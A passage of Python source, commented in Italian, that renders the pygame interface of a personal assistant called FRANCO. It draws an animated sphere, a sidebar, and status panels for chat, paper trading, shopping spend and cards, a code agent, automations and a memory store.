    _C_WARN     = (255, 180, 30)

    def _init_pygame(self) -> bool:
        if not DEPENDENCIES_STATUS.get("pygame"):
            self.logger.warning("UI", "Pygame non disponibile")
            return False
        try:
            pygame.init()
            self._screen = pygame.display.set_mode(
                (UI_WIDTH, UI_HEIGHT),
                pygame.RESIZABLE | pygame.DOUBLEBUF
            )
            pygame.display.set_caption("FRANCO")
            self._clock = pygame.time.Clock()
            pygame.font.init()

            class _SafeFont:
                """Wrapper che filtra caratteri astral-plane (>U+FFFF, es. emoji
                🎉📈🛡️) prima di ogni render/size: SDL_ttf va in segfault nativo
                su questi caratteri e non e' un'eccezione Python catturabile.
                Copre anche il testo generato dall'AI (cloud/locale), che puo'
                contenere qualunque emoji senza controllo."""
                __slots__ = ("_f",)

                def __init__(self, f):
                    self._f = f

                @staticmethod
                def _clean(text):
                    text = str(text)
                    if any(ord(c) > 0xFFFF for c in text):
                        return "".join(c for c in text if ord(c) <= 0xFFFF)
                    return text

                def render(self, text, aa, color, *a, **kw):
                    return self._f.render(self._clean(text), aa, color, *a, **kw)

                def size(self, text):
                    return self._f.size(self._clean(text))

                def __getattr__(self, name):
                    return getattr(self._f, name)

            def _font(name, size, bold=False):
                for fn in (name, "segoe ui", "arial", None):
                    try:
                        if fn:
                            return _SafeFont(pygame.font.SysFont(fn, size, bold=bold))
                        return _SafeFont(pygame.font.Font(None, size))
                    except Exception as _e:
                        pass  # suppressed error
                return _SafeFont(pygame.font.Font(None, size))

            self._fonts = {
                "tiny":    _font("segoe ui", 9),
                "small":   _font("segoe ui", 10),
                "hud":     _font("segoe ui", 11),
                "label":   _font("segoe ui", 12, bold=True),
                "normal":  _font("segoe ui", 13),
                "bold":    _font("segoe ui", 13, bold=True),
                "title":   _font("segoe ui", 16, bold=True),
                "neural":  _font("segoe ui", 18, bold=True),
                "large":   _font("segoe ui", 26, bold=True),
                "xlarge":  _font("segoe ui", 32, bold=True),
                "mono":    _font("consolas",  11),
                "input":   _font("segoe ui", 13),
                "letter":  _font("segoe ui", 12),
            }

            self._generate_sphere_points()
            self._init_orb_sparkles()
            self._init_bg_particles()
            self.logger.success("UI", "Neural Interface inizializzata")
            return True
        except Exception as e:
            self.logger.error("UI", f"Init pygame fallito: {e}")
            return False

    def _generate_sphere_points(self):
        self._sphere_points = []
        n = UI_SPHERE_POINTS
        golden = (1 + math.sqrt(5)) / 2
        for i in range(n):
            theta = 2 * math.pi * i / golden
            phi = math.acos(1 - 2 * (i + 0.5) / n)
            self._sphere_points.append((
                math.sin(phi) * math.cos(theta),
                math.sin(phi) * math.sin(theta),
                math.cos(phi),
            ))

    def _init_orb_sparkles(self):
        """Scintille che vivono sulla superficie della sfera."""
        self._sparkles = []
        for _ in range(120):
            phi   = random.uniform(0, math.pi)
            theta = random.uniform(0, 2 * math.pi)
            self._sparkles.append({
                "phi": phi, "theta": theta,
                "phase": random.uniform(0, math.pi * 2),
                "speed": random.uniform(0.003, 0.012),
                "size":  random.uniform(1.0, 3.5),
                "alpha": random.uniform(80, 220),
            })

    def _init_bg_particles(self):
        """Micro-particelle di sfondo che salgono lentamente."""
        self._bg_particles = []
        for _ in range(60):
            self._bg_particles.append({
                "x": random.uniform(0, UI_WIDTH),
                "y": random.uniform(0, UI_HEIGHT),
                "vy": random.uniform(0.05, 0.25),
                "size": random.uniform(0.5, 1.5),
                "alpha": random.uniform(10, 50),
            })

    # ── helpers ──────────────────────────────────────────────────────

    def _glow_surf(self, w: int, h: int, color: tuple, alpha: int, r: int = 0):
        s = pygame.Surface((w, h), pygame.SRCALPHA)
        cr, cg, cb = color
        if r:
            pygame.draw.rect(s, (cr, cg, cb, alpha), (0, 0, w, h), border_radius=r)
        else:
            s.fill((cr, cg, cb, alpha))
        return s

    def _circle_glow(self, cx, cy, radius, color, alpha):
        """Disegna un cerchio semi-trasparente come strato di glow."""
        d = int(radius) * 2 + 4
        s = pygame.Surface((d, d), pygame.SRCALPHA)
        cr, cg, cb = color
        pygame.draw.circle(s, (cr, cg, cb, alpha), (d // 2, d // 2), int(radius))
        self._screen.blit(s, (cx - d // 2, cy - d // 2))

    def _draw_bar(self, x, y, w, h, value, max_val=100, fg=None, bg=None, r=3):
        fg = fg or self._C_CORE
        bg = bg or self._C_DEEP
        pygame.draw.rect(self._screen, bg, (x, y, w, h), border_radius=r)
        fill = max(0, int(w * value / max_val))
        if fill > 0:
            pygame.draw.rect(self._screen, fg, (x, y, fill, h), border_radius=r)
        pygame.draw.rect(self._screen, self._C_DIM, (x, y, w, h), 1, border_radius=r)

    def _wrap(self, text: str, font, max_w: int):
        words = text.split()
        lines, line = [], ""
        for word in words:
            test = (line + " " + word).strip()
            if font.size(test)[0] <= max_w:
                line = test
            else:
                if line:
                    lines.append(line)
                line = word
        if line:
            lines.append(line)
        return lines or [""]

    def _txt(self, font, text: str, color):
        # I caratteri "astral plane" (>U+FFFF, es. emoji 🎉📈🛡️) mandano in
        # segfault nativo SDL_ttf/pygame — non e' un'eccezione Python catturabile,
        # quindi vanno rimossi PRIMA del render, non dopo. Le risposte AI/cloud
        # possono contenerne qualunque, quindi questo filtro va sempre applicato.
        text = str(text)
        if any(ord(c) > 0xFFFF for c in text):
            text = "".join(c if ord(c) <= 0xFFFF else "" for c in text)
        try:
            return font.render(text, True, color)
        except Exception:
            return font.render("?", True, color)

    def _bar_color(self, v, _theme=None):
        if v > 88: return self._C_DANGER
        if v > 70: return self._C_WARN
        return self._C_SUCCESS

    def _sync_chat(self):
        try:
            snapshot = list(self.transcript_buffer)[-self._CHAT_HISTORY_MAX:]
        except Exception:
            return
        lines = []
        for entry in snapshot:
            try:
                if isinstance(entry, tuple) and len(entry) >= 2:
                    role = str(entry[0])
                    text = str(entry[1])
                    ts = (entry[2].strftime("%H:%M")
                          if len(entry) > 2 and hasattr(entry[2], "strftime") else "")
                    lines.append((role, text, ts))
            except Exception:
                continue
        with self._chat_lock:
            self._chat_lines = lines

    # ── UPDATE ────────────────────────────────────────────────────────

    def _update_particles(self):
        w, h = self._screen.get_width(), self._screen.get_height()
        for p in self._bg_particles:
            p["y"] -= p["vy"]
            p["alpha"] -= 0.08
            if p["y"] < -4 or p["alpha"] < 2:
                p.update({
                    "x": random.uniform(0, w),
                    "y": h + 4,
                    "vy": random.uniform(0.05, 0.25),
                    "alpha": random.uniform(10, 50),
                })
        for sp in self._sparkles:
            sp["phase"] += sp["speed"]

    # ── DRAW BACKGROUND ───────────────────────────────────────────────

    def _draw_background(self):
        w, h = self._screen.get_width(), self._screen.get_height()
        self._screen.fill((18, 18, 18))
        pygame.draw.rect(self._screen, (24, 24, 24), (0, 0, w, h))
        pygame.draw.line(self._screen, (42, 42, 42), (0, 48), (w, 48))

    def _draw_compact_background_widget(self):
        """Widget compatto per standby/background ispirato alla bolla ChatGPT."""
        self._orb_experience.compact_view()
        return
        w, _h = self._screen.get_width(), self._screen.get_height()
        self._screen.fill((0, 0, 0))
        cx = w // 2
        top_y = 8
        pill_w, pill_h = 174, 42
        pill = pygame.Rect(cx - pill_w // 2, top_y, pill_w, pill_h)
        pygame.draw.rect(self._screen, (22, 22, 22), pill, border_radius=22)
        pygame.draw.rect(self._screen, (44, 44, 44), pill, 1, border_radius=22)

        labels = ["E", "M", "", "S"]
        for i, label in enumerate(labels):
            ix = pill.x + 21 + i * 44
            if i == 2:
                pygame.draw.circle(self._screen, (230, 235, 255), (ix, top_y + 21), 15)
                pygame.draw.circle(self._screen, (170, 185, 255), (ix, top_y + 21), 14, 2)
            else:
                pygame.draw.circle(self._screen, (34, 34, 34), (ix, top_y + 21), 15)
                surf = self._txt(self._fonts["bold"], label, (235, 235, 235))
                self._screen.blit(surf, (ix - surf.get_width() // 2, top_y + 21 - surf.get_height() // 2))

        bubble_w = min(420, max(260, w - 28))
        bubble_h = 72
        bubble = pygame.Rect(cx - bubble_w // 2, top_y + pill_h + 8, bubble_w, bubble_h)
        pygame.draw.rect(self._screen, (31, 31, 31), bubble, border_radius=14)
        pygame.draw.rect(self._screen, (72, 72, 72), bubble, 1, border_radius=14)
        msg = "solo quando serve, senza toccare le parti cyber o altre non collegate."
        cy = bubble.y + 13
        for line in self._wrap(msg, self._fonts["bold"], bubble_w - 24)[:3]:
            surf = self._txt(self._fonts["bold"], line, (245, 245, 245))
            self._screen.blit(surf, (bubble.x + 12, cy))
            cy += 17

    # ── DRAW HEADER ───────────────────────────────────────────────────

    def _draw_header(self):
        w = self._screen.get_width()
        title = self._txt(self._fonts["bold"], "FRANCO", (245, 245, 245))
        self._screen.blit(title, (24, 16))
        model = self._txt(self._fonts["hud"], "assistente personale", (170, 170, 170))
        self._screen.blit(model, (88, 18))
        sys_state = self.state.get("system_state", SystemState.IDLE)
        is_standby = bool(self.state.get("standby")) or sys_state == SystemState.STANDBY
        status = "background" if is_standby else "online"
        dot_col = (90, 220, 120) if not is_standby else (150, 150, 150)
        pygame.draw.circle(self._screen, dot_col, (w - 110, 24), 5)
        st = self._txt(self._fonts["hud"], status, (200, 200, 200))
        self._screen.blit(st, (w - 96, 16))

    # ── DRAW MODE TABS ────────────────────────────────────────────────

    # ═══════════════════════════════════════════════════════════════════
    #  SIDEBAR SEZIONI — barra verticale sinistra cliccabile
    # ═══════════════════════════════════════════════════════════════════

    def _draw_sidebar_nav(self, h: int):
        """Disegna la sidebar verticale con le sezioni."""
        sw = self._sidebar_w
        # Background sidebar
        sb = pygame.Surface((sw, h), pygame.SRCALPHA)
        sb.fill((2, 6, 18, 220))
        pygame.draw.line(sb, (*self._C_CORE, 40), (sw-1, 0), (sw-1, h))
        self._screen.blit(sb, (0, 0))

        # Logo FRANCO in cima
        lf = self._fonts.get("hud") or self._fonts.get("small")
        logo = lf.render("F", True, self._C_CORE)
        glow = self._glow_surf(34, 34, self._C_CORE, 30, r=17)
        self._screen.blit(glow, (sw//2 - 17, 10))
        self._screen.blit(logo, (sw//2 - logo.get_width()//2, 18))

        # Tasto sezioni
        icon_f = self._fonts.get("hud") or lf
        label_f = self._fonts.get("tiny") or lf
        self._section_rects = {}
        btn_h = 58
        y0 = 54
        for i, sec in enumerate(self._SECTIONS):
            y = y0 + i * (btn_h + 4)
            active = self._active_section == sec["id"]
            col = sec["color"]
            rect = pygame.Rect(4, y, sw - 8, btn_h)
            self._section_rects[sec["id"]] = rect

            if active:
                # Glow e bordo attivo
                hl = pygame.Surface((sw-8, btn_h), pygame.SRCALPHA)
                hl.fill((*col, 35))
                self._screen.blit(hl, (4, y))
                pygame.draw.rect(self._screen, (*col, 180), rect, 1, border_radius=6)
                pygame.draw.rect(self._screen, col, (0, y+4, 3, btn_h-8), border_radius=2)
            else:
                hover_s = pygame.Surface((sw-8, btn_h), pygame.SRCALPHA)
                hover_s.fill((255, 255, 255, 6))
                self._screen.blit(hover_s, (4, y))

            # Icona
            ic = icon_f.render(sec["icon"], True, col if active else self._C_DIM)
            self._screen.blit(ic, (sw//2 - ic.get_width()//2, y + 8))
            # Label
            lb = label_f.render(sec["label"], True, col if active else self._C_DIM)
            self._screen.blit(lb, (sw//2 - lb.get_width()//2, y + btn_h - 18))

    def _handle_sidebar_click(self, pos: tuple) -> bool:
        """Ritorna True se il click era sulla sidebar (consumato)."""
        x, y = pos
        if x > self._sidebar_w:
            return False
        for sec_id, rect in self._section_rects.items():
            if rect.collidepoint(x, y):
                self._active_section = sec_id
                return True
        return False

    # ═══════════════════════════════════════════════════════════════════
    #  PANNELLI SEZIONE — contenuto centrale per ogni sezione
    # ═══════════════════════════════════════════════════════════════════

    def _draw_section_content(self, x: int, y: int, w: int, h: int):
        """Disegna il contenuto della sezione attiva nel rettangolo dato."""
        sec = self._active_section
        # Ogni sezione non-home ha una input bar in basso
        INPUT_BAR_H = 40
        sec_color = next(
            (s["color"] for s in self._SECTIONS if s["id"] == sec),
            self._C_CORE
        )

        if sec == "home":
            pass  # home è la sfera — già disegnata prima
        elif sec == "chat":
            self._section_chat(x, y, w, h)
        elif sec == "trading":
            content_h = h - INPUT_BAR_H
            self._section_trading(x, y, w, content_h)
            self._draw_sec_output(x + 4, y + content_h - 80, w - 8, 76, sec, sec_color)
            self._draw_section_input_bar(x, y, w, h, sec_color)
        elif sec == "shopping":
            content_h = h - INPUT_BAR_H
            self._section_shopping(x, y, w, content_h)
            self._draw_sec_output(x + 4, y + content_h - 80, w - 8, 76, sec, sec_color)
            self._draw_section_input_bar(x, y, w, h, sec_color)
        elif sec == "code":
            content_h = h - INPUT_BAR_H
            self._section_code(x, y, w, content_h)
            self._draw_sec_output(x + 4, y + content_h - 80, w - 8, 76, sec, sec_color)
            self._draw_section_input_bar(x, y, w, h, sec_color)
        elif sec == "canvas":
            content_h = h - INPUT_BAR_H
            self._canvas.draw(self._screen, (x + 4, y + 4, w - 8, content_h - 8), self._fonts)
            self._draw_section_input_bar(x, y, w, h, sec_color)
        elif sec == "auto":
            content_h = h - INPUT_BAR_H
            self._section_automations(x, y, w, content_h)
            self._draw_sec_output(x + 4, y + content_h - 80, w - 8, 76, sec, sec_color)
            self._draw_section_input_bar(x, y, w, h, sec_color)
        elif sec == "brain":
            content_h = h - INPUT_BAR_H
            self._section_brain(x, y, w, content_h)
            self._draw_sec_output(x + 4, y + content_h - 80, w - 8, 76, sec, sec_color)
            self._draw_section_input_bar(x, y, w, h, sec_color)

    def _panel_bg(self, x, y, w, h, col=None, alpha=200):
        col = col or self._C_PANEL if hasattr(self, "_C_PANEL") else (5,12,30)
        s = pygame.Surface((w, h), pygame.SRCALPHA)
        s.fill((*col, alpha))
        pygame.draw.rect(s, (*self._C_CORE, 30), (0,0,w,h), 1, border_radius=8)
        self._screen.blit(s, (x, y))

    def _section_title(self, x, y, text: str, col=None):
        col = col or self._C_CORE
        f = self._fonts.get("label") or self._fonts.get("hud")
        s = f.render(text, True, col)
        self._screen.blit(s, (x, y))
        pygame.draw.line(self._screen, (*col, 60),
                         (x, y + s.get_height() + 3),
                         (x + s.get_width() + 40, y + s.get_height() + 3))
        return y + s.get_height() + 10

    def _kv(self, x, y, key: str, val: str, kc=None, vc=None):
        """Disegna una riga chiave: valore."""
        kc = kc or self._C_DIM
        vc = vc or self._C_TEXT
        fk = self._fonts.get("small") or self._fonts.get("hud")
        fv = self._fonts.get("small") or self._fonts.get("hud")
        ks = fk.render(key, True, kc)
        vs = fv.render(str(val), True, vc)
        self._screen.blit(ks, (x, y))
        self._screen.blit(vs, (x + 130, y))
        return y + ks.get_height() + 3

    # ── SEZIONE: CHAT ─────────────────────────────────────────────────────────
    def _section_chat(self, x, y, w, h):
        self._panel_bg(x, y, w, h, (3,8,20), 210)
        cy = self._section_title(x+12, y+10, "CHAT  —  F.R.A.N.C.O.", self._C_CORE)
        self._draw_right_panel(x+8, cy, w-16, h - (cy - y) - 8)

    # ── SEZIONE: TRADING ──────────────────────────────────────────────────────
    def _section_trading(self, x, y, w, h):
        col = (0, 220, 130)
        self._panel_bg(x, y, w, h, (3,12,8), 210)
        cy = self._section_title(x+12, y+10, "TRADING  —  Paper Account", col)

        panel = self.state.get("trading_panel", {})
        total = panel.get("total_value", 0)
        pnl   = panel.get("day_pnl_pct", 0.0)
        pnl_c = col if pnl >= 0 else self._C_DANGER
        stream = "LIVE" if panel.get("stream_active") else "OFF"

        cy = self._kv(x+16, cy,   "Valore portafoglio", f"${total:,.0f}", vc=col)
        cy = self._kv(x+16, cy,   "P&L oggi",           f"{pnl:+.2f}%",  vc=pnl_c)
        cy = self._kv(x+16, cy,   "Stream dati",        stream,
                      vc=col if stream=="LIVE" else self._C_DANGER)
        cy += 10

        positions = panel.get("positions", [])
        if positions:
            cy = self._section_title(x+12, cy, "POSIZIONI", col)
            for pos in positions[:8]:
                sym  = pos.get("symbol","?")
                ppnl = pos.get("pnl_pct", 0.0)
                pc   = col if ppnl >= 0 else self._C_DANGER
                cy   = self._kv(x+16, cy, sym, f"{ppnl:+.1f}%", vc=pc)
        else:
            f = self._fonts.get("small")
            if f:
                t = f.render("Nessuna posizione aperta", True, self._C_DIM)
                self._screen.blit(t, (x+16, cy))
            cy += 20

        cy += 8
        cy = self._section_title(x+12, cy, "COMANDI RAPIDI", col)
        cmds = ["portafoglio", "stream status", "rotazione status",
                "compra AAPL 1", "vendi tutto"]
        f = self._fonts.get("small")
        for cmd in cmds:
            if f and cy + 18 < y + h - 10:
                cs = f.render(f"  › {cmd}", True, self._C_DIM)
                self._screen.blit(cs, (x+16, cy))
                cy += cs.get_height() + 2

    # ── SEZIONE: SHOPPING ─────────────────────────────────────────────────────
    def _section_shopping(self, x, y, w, h):
        col = (255, 200, 50)
        self._panel_bg(x, y, w, h, (18,14,3), 210)
        cy = self._section_title(x+12, y+10, "SHOPPING  —  Amazon IT", col)

        # Spesa
        try:
            franco = getattr(self, "_franco_ref", None)
            shopping = getattr(franco, "shopping", None) if franco else None
            if shopping:
                sp = shopping.spend_status()
                cy = self._kv(x+16, cy, "Spesa oggi",   f"€{sp['daily']:.2f}", vc=col)
                cy = self._kv(x+16, cy, "Limite",       f"€{sp['daily_lim']:.0f}")
                cy = self._kv(x+16, cy, "Rimasto",      f"€{sp['remaining']:.2f}",
                              vc=(0,220,130) if sp['remaining'] > 50 else self._C_DANGER)
                cy = self._kv(x+16, cy, "Mese",         f"€{sp['monthly']:.2f}")
                cy += 8

                # Carte
                cards = shopping.vault.list_cards()
                if cards:
                    cy = self._section_title(x+12, cy, "CARTE", col)
                    f  = self._fonts.get("small")
                    for c in cards[:4]:
                        star = "★ " if c["default"] else "  "
                        line = f"{star}{c['name']}  ****{c['last4']}"
                        ls = f.render(line, True, col if c["default"] else self._C_TEXT)
                        self._screen.blit(ls, (x+16, cy)); cy += ls.get_height() + 3
                cy += 8

                # Ultimi aggiunti
                ch = shopping.cart_history()
                if ch:
                    cy = self._section_title(x+12, cy, "ULTIMO CARRELLO", col)
                    f  = self._fonts.get("small")
                    for item in ch[-6:]:
                        ls = f.render(f"• {item.get('name','?')[:28]}", True, self._C_TEXT)
                        self._screen.blit(ls, (x+16, cy)); cy += ls.get_height() + 3
        except Exception as _e:
            pass  # suppressed error

        # Comandi rapidi
        cy += 6
        cy = self._section_title(x+12, cy, "COMANDI RAPIDI", col)
        f = self._fonts.get("small")
        for cmd in ["cerca arduino nano", "aggiungi [prodotto]",
                    "mostra carte", "spesa oggi", "checkout"]:
            if f and cy + 18 < y + h - 10:
                cs = f.render(f"  › {cmd}", True, self._C_DIM)
                self._screen.blit(cs, (x+16, cy)); cy += cs.get_height() + 2

    # ── SEZIONE: CODE AGENT ───────────────────────────────────────────────────
    def _section_code(self, x, y, w, h):
        col = (180, 100, 255)
        self._panel_bg(x, y, w, h, (10,5,18), 210)
        cy = self._section_title(x+12, y+10, "CODE AGENT  —  FRANCO Code", col)

        f = self._fonts.get("small")
        franco = getattr(self, "_franco_ref", None)

        # Mostra stato live del CodeAgent se disponibile
        agent = None
        try:
            agent = (getattr(franco.engine, "_code_agent", None) if franco else None)
        except Exception as _e:
            pass  # suppressed error

        if agent and agent.session.project_path:
            proj = str(agent.session.project_path)
            proj_short = proj[-38:] if len(proj) > 38 else proj
            cy = self._kv(x+16, cy, "Progetto", proj_short, vc=col)
            cy = self._kv(x+16, cy, "Turni AI",    str(len(agent.session.history) // 2))
            n_pend = len(agent.session.pending_edits)
            cy = self._kv(x+16, cy, "Modifiche sospese", str(n_pend),
                          vc=col if n_pend > 0 else self._C_TEXT)
            n_touched = len(agent.session.files_touched)
            cy = self._kv(x+16, cy, "File toccati", str(n_touched), vc=col if n_touched else self._C_TEXT)
            if agent.session.files_touched:
                cy += 4
                cy = self._section_title(x+12, cy, "ULTIMI FILE TOCCATI", col)
                for fp in agent.session.files_touched[-4:]:
                    if f and cy + 18 < y + h - 50:
                        ls = f.render(f"  ✓ {fp[-40:]}", True, col)
                        self._screen.blit(ls, (x+16, cy)); cy += ls.get_height() + 2
            # Ultima shell output (preview)
            last_shell = getattr(agent.session, "last_shell_output", None)
            if last_shell and cy + 30 < y + h - 50:
                cy += 4
                cy = self._section_title(x+12, cy, "ULTIMO OUTPUT SHELL", col)
                preview = last_shell[:120].replace("\n", " ↩ ")
                if f and cy + 16 < y + h - 50:
                    ps = f.render(f"  {preview}", True, self._C_DIM)
                    self._screen.blit(ps, (x+16, cy)); cy += ps.get_height() + 2
        else:
            cy = self._kv(x+16, cy, "Modello",   "nemotron → deepseek → qwen", vc=col)
            cy = self._kv(x+16, cy, "Tools",     "56 (file, shell, git, test…)")
            cy = self._kv(x+16, cy, "Stato",     "nessun progetto aperto", vc=self._C_DIM)

        cy += 10
        cy = self._section_title(x+12, cy, "COMANDI RAPIDI", col)
        examples = [
            "apri progetto C:\\mio\\progetto",
            "agente: aggiungi logging a tutti i file",
            "mostra modifiche in sospeso",
            "applica modifiche",
            "cerca nel progetto: def login",
        ]
        for ex in examples:
            if f and cy + 18 < y + h - 10:
                cs = f.render(f"  › {ex}", True, self._C_DIM)
                self._screen.blit(cs, (x+16, cy)); cy += cs.get_height() + 2

    # ── SEZIONE: AUTOMAZIONI ─────────────────────────────────────────────────
    def _section_automations(self, x, y, w, h):
        col = (255, 140, 0)
        self._panel_bg(x, y, w, h, (18,10,3), 210)
        cy = self._section_title(x+12, y+10, "AUTOMAZIONI", col)

        try:
            franco = getattr(self, "_franco_ref", None)
            auto   = getattr(franco, "auto", None) if franco else None
            if auto:
                st = auto.status()
                cy = self._kv(x+16, cy, "Stato",   "ATTIVO" if st["running"] else "FERMO",
                              vc=col if st["running"] else self._C_DANGER)
                cy = self._kv(x+16, cy, "Regole",  f"{st['enabled']}/{st['rules']} attive")
                m  = st["metrics"]
                cy = self._kv(x+16, cy, "CPU",     f"{m.get('cpu',0):.0f}%")
                cy = self._kv(x+16, cy, "RAM",     f"{m.get('ram',0):.0f}%")
                cy = self._kv(x+16, cy, "Disco",   f"{m.get('disk',0):.0f}%")
                cy += 8

                from franco_automations import AutomationEngine
                if hasattr(auto, "_rules"):
                    cy = self._section_title(x+12, cy, "REGOLE", col)
                    f  = self._fonts.get("small")
                    for rule in list(auto._rules.values())[:8]:
                        st2 = "✓" if rule.enabled else "—"
                        txt = f"{st2} {rule.name[:32]}"
                        c2  = col if rule.enabled else self._C_DIM
                        ls  = f.render(txt, True, c2) if f else None
                        if ls and cy + 18 < y + h - 40:
                            self._screen.blit(ls, (x+16, cy)); cy += ls.get_height() + 2
        except Exception as _e:
            pass  # suppressed error

        cy += 6
        cy = self._section_title(x+12, cy, "CREA REGOLA", col)
        f = self._fonts.get("small")
        examples = [
            "ogni mattina alle 9 brief",
            "quando cpu supera 85 avvisami",
            "se portafoglio scende 5% parla",
        ]
        for ex in examples:
            if f and cy + 18 < y + h - 10:
                cs = f.render(f"  › {ex}", True, self._C_DIM)
                self._screen.blit(cs, (x+16, cy)); cy += cs.get_height() + 2

    # ── SEZIONE: SECOND BRAIN ────────────────────────────────────────────────
    def _section_brain(self, x, y, w, h):
        col = (255, 80, 120)
        self._panel_bg(x, y, w, h, (18,3,8), 210)
        cy = self._section_title(x+12, y+10, "SECOND BRAIN  —  RAG Memory", col)

        f = self._fonts.get("small")
        try:
            franco = getattr(self, "_franco_ref", None)
            # Usa il Second Brain (franco.brain) se disponibile, altrimenti memory
            brain_mod = getattr(franco, "brain", None) if franco else None
            if brain_mod and hasattr(brain_mod, "stats"):
                st = brain_mod.stats()
                cy = self._kv(x+16, cy, "Frammenti",    str(st.get("frammenti", "?")), vc=col)
                cy = self._kv(x+16, cy, "Conversazioni", str(st.get("conversazioni", "?")))
                cy = self._kv(x+16, cy, "File caricati", str(st.get("file_caricati", "?")))
                cy = self._kv(x+16, cy, "Motore",        "TF-IDF offline + SQLite")
                cy += 8
                # Mostra ultimi ricordi
                try:
                    recent = brain_mod.get_recent(n=3) if hasattr(brain_mod, "get_recent") else []
                    if recent:
                        cy = self._section_title(x+12, cy, "ULTIMI RICORDI", col)
                        for snippet in recent:
                            txt_short = str(snippet)[:55].replace("\n", " ")
                            if f and cy + 16 < y + h - 50:
                                rs = f.render(f"  · {txt_short}", True, self._C_DIM)
                                self._screen.blit(rs, (x+16, cy)); cy += rs.get_height() + 2
                except Exception as _e:
                    pass  # suppressed error
            else:
                mem = getattr(franco, "memory", None) if franco else None
                if mem and hasattr(mem, "get_stats"):
                    stats = mem.get_stats()
                    cy = self._kv(x+16, cy, "Ricordi",   str(stats.get("total_memories", "?")), vc=col)
                    cy = self._kv(x+16, cy, "Categorie", str(stats.get("categories", "?")))
                    cy += 8
        except Exception as _e:
            pass  # suppressed error

        cy = self._section_title(x+12, cy, "COMANDI RAPIDI", col)
        for cmd in ["ricorda [fatto importante]",
                    "cosa sai su [argomento]",
                    "dimentica [argomento]",
                    "mostra memoria",
                    "carica documento [percorso]"]:
            if f and cy + 18 < y + h - 10:
                cs = f.render(f"  › {cmd}", True, self._C_DIM)
                self._screen.blit(cs, (x+16, cy)); cy += cs.get_height() + 2

    def _draw_mode_tabs(self, cx: int, top_y: int):
        """Barra tab stile screenshot: + Text | Text Only | Voice Only | Silent"""
        sys_state = self.state.get("system_state", SystemState.IDLE)
        listening = sys_state == SystemState.LISTENING
        tabs = [
            ("+ Text",     True),
            ("Text Only",  not listening),
            ("Voice Only", listening),
            ("Silent",     sys_state == SystemState.STANDBY),
        ]
        total_w = 0
        rendered = []
        for label, active in tabs:
            s = self._txt(self._fonts["hud"], label, self._C_CORE if active else self._C_DIM)
            rendered.append((s, active))
            total_w += s.get_width() + 32
        x = cx - total_w // 2
        for s, active in rendered:
            if active:
                bg = self._glow_surf(s.get_width() + 24, 22, self._C_CORE, 25, r=11)
                self._screen.blit(bg, (x - 12, top_y - 3))
                pygame.draw.rect(self._screen, self._C_CORE,
                                 (x - 12, top_y - 3, s.get_width() + 24, 22), 1, border_radius=11)
            self._screen.blit(s, (x, top_y + 2))
            x += s.get_width() + 32

    # ── DRAW ORBE NEURALE (sfera organica) ────────────────────────────

    def _draw_center(self, cx: int, cy: int, r: float):
        sys_state = self.state.get("system_state", SystemState.IDLE)
        listening = sys_state == SystemState.LISTENING
        speaking  = sys_state == SystemState.SPEAKING
        thinking  = sys_state == SystemState.PROCESSING

        mic = float(self.state.get("mic_level", 0) or 0)
        pulse_amp = 1.0 + 0.08 * math.sin(self._pulse * 3)
        if listening and mic > 0.05:
            pulse_amp = 1.0 + 0.18 * mic + 0.08 * math.sin(self._pulse * 6)
        elif speaking:
            pulse_amp = 1.0 + 0.12 * abs(math.sin(self._pulse * 4))
        elif thinking:
            pulse_amp = 1.0 + 0.06 * math.sin(self._pulse * 8)

        R = r * pulse_amp

        # ── Glow esterno a strati (large → small, alpha basso → alto) ──
        glow_layers = [
            (R * 2.4, 5),
            (R * 1.9, 9),
            (R * 1.55, 14),
            (R * 1.30, 20),
            (R * 1.12, 30),
        ]
        for gr, ga in glow_layers:
            self._circle_glow(cx, cy, gr, self._C_MID, ga)

        # ── Corpo della sfera (dot-cloud organica) ───────────────────
        cos_a = math.cos(self._angle * 0.7)
        sin_a = math.sin(self._angle * 0.7)

        for px, py, pz in self._sphere_points:
            rx = px * cos_a - pz * sin_a
            rz = px * sin_a + pz * cos_a
            depth = (rz + 1) / 2

            # distorsione organica basata su onda
            distort = 1.0 + 0.06 * math.sin(px * 8 + self._pulse * 2) \
                          + 0.04 * math.cos(py * 6 + self._pulse * 1.5)
            if listening and mic > 0.05:
                distort += 0.12 * mic * math.sin(px * 12 + self._pulse * 5)

            sx = cx + rx * R * distort
            sy = cy + py * R * distort * 0.97

            # Colore: bianco-azzurro in cima, blu scuro sul retro
            t = depth
            dot_r = int(self._C_SPARK[0] * t + self._C_OUTER[0] * (1 - t))
            dot_g = int(self._C_SPARK[1] * t + self._C_OUTER[1] * (1 - t))
            dot_b = int(self._C_SPARK[2] * t + self._C_OUTER[2] * (1 - t))
            alpha = int(30 + 200 * depth)
            sz = max(1, int(2.8 * depth))

            try:
                dot = pygame.Surface((sz * 2 + 1,) * 2, pygame.SRCALPHA)
                pygame.draw.circle(dot, (dot_r, dot_g, dot_b, alpha), (sz, sz), sz)
                self._screen.blit(dot, (int(sx) - sz, int(sy) - sz))
            except Exception as _e:
                pass  # suppressed error

        # ── Inner glow — cuore brillante ─────────────────────────────
        self._circle_glow(cx, cy, R * 0.55, self._C_CORE, 40)
        self._circle_glow(cx, cy, R * 0.30, self._C_SPARK, 25)
        self._circle_glow(cx, cy, R * 0.12, (240, 250, 255), 18)

        # ── Scintille sulla superficie ────────────────────────────────
        for sp in self._sparkles:
            a = sp["phase"]
            brightness = (math.sin(a) + 1) / 2
            if brightness < 0.2:
                continue
            phi = sp["phi"]
            theta = sp["theta"] + self._angle * 0.3
            nx = math.sin(phi) * math.cos(theta)
            ny = math.sin(phi) * math.sin(theta)
            nz = math.cos(phi)
            # ruota sull'asse Y
            rx2 = nx * cos_a - nz * sin_a
            rz2 = nx * sin_a + nz * cos_a
            depth2 = (rz2 + 1) / 2
            if depth2 < 0.3:
                continue
            sx2 = int(cx + rx2 * R * 1.02)
            sy2 = int(cy + ny * R * 0.99)
            sz2 = max(1, int(sp["size"] * brightness * depth2))
            alpha2 = int(sp["alpha"] * brightness * depth2)
            try:
                dot2 = pygame.Surface((sz2 * 2 + 1,) * 2, pygame.SRCALPHA)
                pygame.draw.circle(dot2, (*self._C_SPARK, alpha2), (sz2, sz2), sz2)
                self._screen.blit(dot2, (sx2 - sz2, sy2 - sz2))
            except Exception as _e:
                pass  # suppressed error

    # ── WAVEFORM (barra sottile sotto la sfera) ───────────────────────

    def _draw_waveform(self, x: int, y: int, w: int, h: int):
        mic = float(self.state.get("mic_level", 0) or 0)
        speaking = bool(self.state.get("speaking", False))
        amp = mic * h * 0.9 if mic > 0.03 else 0
        if speaking:
